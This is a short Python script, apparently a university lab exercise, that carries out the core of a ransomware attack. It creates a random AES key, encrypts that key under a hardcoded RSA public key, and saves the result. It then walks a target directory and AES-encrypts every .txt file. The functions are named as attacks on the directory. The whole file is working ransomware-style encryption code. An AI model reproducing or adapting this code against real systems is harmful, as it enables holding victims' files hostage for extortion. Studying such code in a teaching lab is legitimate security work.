from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
import os

# Public key for RSA encryption
public_key = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCMqf4MyQYxZ5wxuYbFtztnRdeY
4mVfgzFUs2/9i4nUJvlltSdD7NApUynU+5UeyLo+kUpxpWSvFc2H+3RDHrNVqxDs
DKqeoh2giLPQP1bh+oiBQM3eEQiEOHC+OW3fFNIe47EB4j0sEtK+vlrR0BGqIwHO
gabaFqJATO+K+QSJ8wIDAQAB
-----END PUBLIC KEY-----"""

# Generate a random shared AES key (16 bytes)
shared_key = get_random_bytes(16)

# Encrypt the shared AES key with RSA (public key)
def encrypted_shared_key(shared_key, public_key):
    rsa_key = RSA.import_key(public_key)
    cipher_rsa = PKCS1_OAEP.new(rsa_key)
    encrypted_message = cipher_rsa.encrypt(shared_key)
    
    # Save the encrypted shared key to a file
    with open('/home/cse/Lab3/Solutions/EncryptedSharedKey', "wb") as f:
        f.write(encrypted_message)

# Encrypt the shared key using the public RSA key
encrypted_shared_key(shared_key, public_key)

# AES file encryption function
def encrypt_file(filepath, shared_key):
    # Initialize AES in CBC mode with the shared key
    cipher_aes = AES.new(shared_key, AES.MODE_CBC)
    
    # Read the file content
    with open(filepath, "rb") as f:
        plaintext = f.read()
    
    # Pad the plaintext to be a multiple of 16 bytes
    padded_data = pad(plaintext, AES.block_size)
    
    # Encrypt the padded data
    encrypted_data = cipher_aes.encrypt(padded_data)
    
    # Write the IV and encrypted data to a new file (e.g., file.txt.encrypted)
    with open(filepath + ".encrypted", "wb") as f:
        f.write(cipher_aes.iv)  # Write the IV first
        f.write(encrypted_data)  # Write the encrypted content

# Directory containing files to encrypt
attacking_directory = "/home/cse/Lab3/Solutions"

# Function to encrypt all .txt files in the directory
def attack_directory(attacking_directory):
    # Loop through all files in the directory
    for file in os.listdir(attacking_directory):
        filepath = os.path.join(attacking_directory, file)
        # Encrypt files with .txt extension
        if filepath.endswith(".txt"):
            print(f"Encrypting: {filepath}")  # Debugging line to verify the file being processed
            encrypt_file(filepath, shared_key)

# Encrypt all .txt files in the directory
attack_directory(attacking_directory)
